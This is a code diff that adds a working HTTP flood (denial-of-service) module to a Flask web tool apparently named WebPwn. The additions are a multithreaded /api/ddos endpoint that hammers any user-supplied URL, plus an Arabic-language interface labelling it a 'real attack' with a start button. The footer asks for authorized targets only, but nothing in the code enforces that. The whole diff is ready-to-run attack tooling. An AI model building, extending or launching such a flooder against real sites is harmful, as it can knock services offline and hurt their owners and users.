@@ -793,8 +793,108 @@ def api_raw():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
+
+# ====================== DDoS / HTTP FLOOD ======================
+@app.route("/api/ddos", methods=["POST"])
+def api_ddos():
+    """
+    Real HTTP Flood / DoS module.
+    Launches concurrent requests against the target.
+    """
+    data = request.get_json() or {}
+    target = data.get("url", "").strip()
+    threads = min(int(data.get("threads", 50)), 300)          # hard limit
+    requests_per_thread = min(int(data.get("requests", 20)), 100)
+    method = data.get("method", "GET").upper()
+    duration = min(int(data.get("duration", 0)), 60)          # seconds, 0 = fixed count
+    path = data.get("path", "/")
+
+    if not target:
+        return jsonify({"error": "URL required"}), 400
+
+    target = normalize_url(target)
+    if not target.endswith("/") and not path.startswith("http"):
+        flood_url = urljoin(target + "/", path.lstrip("/"))
+    else:
+        flood_url = target if path == "/" else urljoin(target + "/", path.lstrip("/"))
+
+    total_sent = 0
+    total_success = 0
+    total_fail = 0
+    status_codes = {}
+    start_time = time.time()
+
+    def worker(n_requests):
+        nonlocal total_sent, total_success, total_fail
+        local_success = 0
+        local_fail = 0
+        local_codes = {}
+        session = requests.Session()
+        session.verify = False
+        headers = DEFAULT_HEADERS.copy()
+        headers["Connection"] = "keep-alive"
+        headers["Cache-Control"] = "no-cache"
+        headers["Pragma"] = "no-cache"
+
+        end_by_time = time.time() + duration if duration > 0 else None
+        count = 0
+
+        while True:
+            if end_by_time and time.time() >= end_by_time:
+                break
+            if duration == 0 and count >= n_requests:
+                break
+
+            try:
+                if method == "GET":
+                    r = session.get(flood_url, headers=headers, timeout=6, allow_redirects=False)
+                elif method == "POST":
+                    r = session.post(flood_url, headers=headers, data={"x": "1"}, timeout=6, allow_redirects=False)
+                else:
+                    r = session.request(method, flood_url, headers=headers, timeout=6, allow_redirects=False)
+
+                code = r.status_code
+                local_codes[code] = local_codes.get(code, 0) + 1
+                local_success += 1
+            except Exception:
+                local_fail += 1
+            count += 1
+
+        return local_success, local_fail, local_codes, count
+
+    # Launch workers
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(worker, requests_per_thread) for _ in range(threads)]
+        for fut in concurrent.futures.as_completed(futures):
+            try:
+                s, f, codes, sent = fut.result()
+                total_success += s
+                total_fail += f
+                total_sent += sent
+                for code, cnt in codes.items():
+                    status_codes[code] = status_codes.get(code, 0) + cnt
+            except Exception:
+                total_fail += 1
+
+    elapsed = round(time.time() - start_time, 2)
+    rps = round(total_sent / elapsed, 1) if elapsed > 0 else 0
+
+    return jsonify({
+        "target": flood_url,
+        "threads": threads,
+        "total_sent": total_sent,
+        "success": total_success,
+        "failed": total_fail,
+        "status_codes": status_codes,
+        "elapsed": elapsed,
+        "requests_per_second": rps,
+        "method": method
+    })
+
+
 # ====================== FRONTEND ======================
 HTML_TEMPLATE = r'''<!DOCTYPE html>
+
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
@@ -950,9 +1050,54 @@ HTML_TEMPLATE = r'''<!DOCTYPE html>
       </div>
     </section>
 
+    <!-- DDoS / HTTP Flood -->
+    <section class="bg-cyber-900 border border-red-900/50 rounded-xl p-5">
+      <h2 class="text-lg font-semibold mb-1 text-red-400">DDoS / HTTP Flood</h2>
+      <p class="text-xs text-gray-500 mb-4">هجوم حقيقي بإرسال آلاف الطلبات المتزامنة (HTTP Flood)</p>
+      
+      <div class="grid sm:grid-cols-2 gap-3 mb-3">
+        <div>
+          <label class="text-xs text-gray-400 block mb-1">الهدف</label>
+          <input id="ddosUrl" type="text" placeholder="https://target.com" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
+        </div>
+        <div>
+          <label class="text-xs text-gray-400 block mb-1">المسار (اختياري)</label>
+          <input id="ddosPath" type="text" value="/" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
+        </div>
+        <div>
+          <label class="text-xs text-gray-400 block mb-1">عدد الـ Threads</label>
+          <input id="ddosThreads" type="number" value="50" min="1" max="300" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
+        </div>
+        <div>
+          <label class="text-xs text-gray-400 block mb-1">طلبات لكل Thread</label>
+          <input id="ddosReqs" type="number" value="20" min="1" max="100" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
+        </div>
+        <div>
+          <label class="text-xs text-gray-400 block mb-1">المدة بالثواني (0 = ثابت)</label>
+          <input id="ddosDuration" type="number" value="0" min="0" max="60" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
+        </div>
+        <div>
+          <label class="text-xs text-gray-400 block mb-1">Method</label>
+          <select id="ddosMethod" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal">
+            <option>GET</option>
+            <option>POST</option>
+            <option>HEAD</option>
+          </select>
+        </div>
+      </div>
+
+      <button id="ddosBtn" onclick="startDDoS()" class="px-5 py-2.5 bg-red-600 hover:bg-red-500 text-white font-medium rounded-lg text-sm flex items-center gap-2">
+        <span id="ddosBtnText">🚀 بدء الهجوم</span>
+        <svg id="ddosSpinner" class="hidden animate-spin w-4 h-4" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
+      </button>
+
+      <div id="ddosResult" class="hidden mt-4 bg-cyber-950 border border-cyber-700 rounded-lg p-4 text-sm terminal"></div>
+    </section>
+
     <!-- Footer note -->
     <p class="text-center text-xs text-gray-600 pb-8">WebPwn يعمل محلياً في الساندبوكس. استخدمه فقط على أهداف مصرح بها.</p>
   </main>
+
 
   <script>
     let lastResults = [];
@@ -1136,10 +1281,69 @@ HTML_TEMPLATE = r'''<!DOCTYPE html>
       lastResults = [];
     }
 
+    async function startDDoS() {
+      const url = document.getElementById('ddosUrl').value.trim();
+      if (!url) { alert('أدخل رابط الهدف'); return; }
+
+      const threads = parseInt(document.getElementById('ddosThreads').value) || 50;
+      const requests = parseInt(document.getElementById('ddosReqs').value) || 20;
+      const duration = parseInt(document.getElementById('ddosDuration').value) || 0;
+      const method = document.getElementById('ddosMethod').value;
+      const path = document.getElementById('ddosPath').value || '/';
+
+      const btn = document.getElementById('ddosBtn');
+      const btnText = document.getElementById('ddosBtnText');
+      const spinner = document.getElementById('ddosSpinner');
+      const resultDiv = document.getElementById('ddosResult');
+
+      btn.disabled = true;
+      btnText.textContent = 'جاري الهجوم...';
+      spinner.classList.remove('hidden');
+      resultDiv.classList.add('hidden');
+
+      try {
+        const res = await fetch('/api/ddos', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ url, threads, requests, duration, method, path })
+        });
+        const data = await res.json();
+        if (data.error) throw new Error(data.error);
+
+        let codesHtml = '';
+        if (data.status_codes) {
+          codesHtml = Object.entries(data.status_codes)
+            .map(([code, cnt]) => `<span class="inline-block ml-2 px-2 py-0.5 rounded bg-cyber-800">${code}: ${cnt}</span>`)
+            .join('');
+        }
+
+        resultDiv.innerHTML = `
+          <div class="space-y-2">
+            <div class="text-red-400 font-medium">✓ انتهى الهجوم</div>
+            <div><span class="text-gray-500">الهدف:</span> ${escapeHtml(data.target)}</div>
+            <div><span class="text-gray-500">Threads:</span> ${data.threads} &nbsp;|&nbsp; <span class="text-gray-500">Method:</span> ${data.method}</div>
+            <div><span class="text-gray-500">إجمالي الطلبات:</span> <span class="text-cyber-accent">${data.total_sent}</span></div>
+            <div><span class="text-gray-500">ناجح:</span> <span class="text-green-400">${data.success}</span> &nbsp;|&nbsp; <span class="text-gray-500">فشل:</span> <span class="text-red-400">${data.failed}</span></div>
+            <div><span class="text-gray-500">الوقت:</span> ${data.elapsed}ث &nbsp;|&nbsp; <span class="text-gray-500">السرعة:</span> <span class="text-cyber-accent">${data.requests_per_second} req/s</span></div>
+            <div class="pt-1">${codesHtml}</div>
+          </div>
+        `;
+        resultDiv.classList.remove('hidden');
+      } catch (e) {
+        resultDiv.innerHTML = `<div class="text-red-400">خطأ: ${escapeHtml(e.message)}</div>`;
+        resultDiv.classList.remove('hidden');
+      } finally {
+        btn.disabled = false;
+        btnText.textContent = '🚀 بدء الهجوم';
+        spinner.classList.add('hidden');
+      }
+    }
+
     function escapeHtml(s) {
       if (!s) return '';
       return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
     }
+
 
     // Enter key
     document.getElementById('targetUrl').addEventListener('keydown', e => {
